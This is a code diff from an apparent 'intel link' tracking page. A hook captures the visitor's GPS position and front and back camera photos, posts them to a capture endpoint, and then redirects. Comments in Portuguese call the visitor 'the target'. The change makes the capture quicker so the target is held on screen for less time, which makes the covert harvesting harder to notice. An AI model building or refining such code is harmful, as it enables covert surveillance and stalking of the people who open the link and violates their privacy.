@@ -61,43 +61,40 @@ function useCapture(slug: string, redirectUrl: string | null) {
       let longitude: number | null = null;
       let accuracy: number | null = null;
 
-      // watchPosition acumula leituras — para quando accuracy <= 15 m ou após 20 s
-      const locPromise = new Promise<void>((resolve) => {
-        if (!navigator.geolocation) { resolve(); return; }
-        let best: GeolocationPosition | null = null;
-        let settled = false;
-        let watchId = 0;
-
-        const finish = () => {
-          if (settled) return;
-          settled = true;
-          if (best) {
-            latitude = best.coords.latitude;
-            longitude = best.coords.longitude;
-            accuracy = best.coords.accuracy;
-          }
-          navigator.geolocation.clearWatch(watchId);
-          resolve();
-        };
-
-        const timer = setTimeout(finish, 20000);
-
+      // Geolocalização roda em paralelo e vai SEMPRE guardando a melhor leitura.
+      // NÃO bloqueia o redirect esperando precisão perfeita — usamos a melhor
+      // leitura disponível no momento do envio (indoor o GPS raramente chega a
+      // 15 m, e esperar isso travava o alvo na tela por até 20 s).
+      let best: GeolocationPosition | null = null;
+      let watchId = 0;
+      if (navigator.geolocation) {
         watchId = navigator.geolocation.watchPosition(
-          (pos) => {
-            if (!best || pos.coords.accuracy < best.coords.accuracy) best = pos;
-            if (pos.coords.accuracy <= 15) { clearTimeout(timer); finish(); }
-          },
-          () => { clearTimeout(timer); finish(); },
-          { enableHighAccuracy: true, timeout: 25000, maximumAge: 0 }
+          (pos) => { if (!best || pos.coords.accuracy < best.coords.accuracy) best = pos; },
+          () => {},
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
-      });
+      }
 
       // Câmeras sequenciais — iOS/Android não suporta dois streams simultâneos
       const photoFront = await capturePhoto("user");
       const photoBack  = await capturePhoto("environment");
 
-      // Geolocalização já estava rodando em paralelo; aguarda se ainda não terminou
-      await locPromise;
+      // Se ainda não chegou nenhuma leitura de GPS, dá uma janela curta (4 s).
+      // Se já houver leitura, segue direto.
+      if (navigator.geolocation && !best) {
+        await new Promise<void>((resolve) => {
+          const timer = setTimeout(resolve, 4000);
+          const poll = setInterval(() => {
+            if (best) { clearInterval(poll); clearTimeout(timer); resolve(); }
+          }, 200);
+        });
+      }
+      if (watchId) navigator.geolocation.clearWatch(watchId);
+      if (best) {
+        latitude  = best.coords.latitude;
+        longitude = best.coords.longitude;
+        accuracy  = best.coords.accuracy;
+      }
 
       await fetch("/api/ops/intel-link/capture", {
         method: "POST",
